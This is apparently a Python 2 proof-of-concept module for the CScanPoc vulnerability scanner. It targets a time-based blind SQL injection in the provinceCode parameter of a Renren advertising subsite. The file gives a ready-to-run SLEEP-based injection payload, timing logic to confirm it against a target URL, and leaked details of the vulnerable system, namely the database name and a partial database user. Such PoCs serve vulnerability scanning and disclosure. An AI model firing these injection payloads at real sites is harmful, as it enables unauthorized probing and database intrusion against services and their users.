# coding: utf-8
import time

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Renren_0101'  # 平台漏洞编号
    name = '人人网旗下分站SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-05-13'  # 漏洞公布时间
    desc = '''
    登陆后注入
    URL：http://...../bolt/member/city.htm?provinceCode=0086130000000000
    人人广告系统 - 中小客户自助系统,provinceCode参数注入
    Payload：/bolt/member/city.htm?provinceCode=0086130000000000'+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))a)+AND+'1'%3d'1
    current database: 'jebe_main'
    current user: ad@10.4.*.*
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=191980
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '人人网'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '76cb45d4-3773-4ea9-9d7b-d3ba8806a1d2'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload1 = "/bolt/member/city.htm?provinceCode=0086130000000000'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)+AND+'1'%3d'1"
            payload2 = "/bolt/member/city.htm?provinceCode=0086130000000000"
            url = self.target + payload1
            url2 = self.target + payload2
            start_time = time.time()
            _response = requests.get(url)
            end_time1 = time.time()
            _response = requests.get(url2)
            end_time2 = time.time()
            if (end_time1-start_time) - (end_time2-end_time1) > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
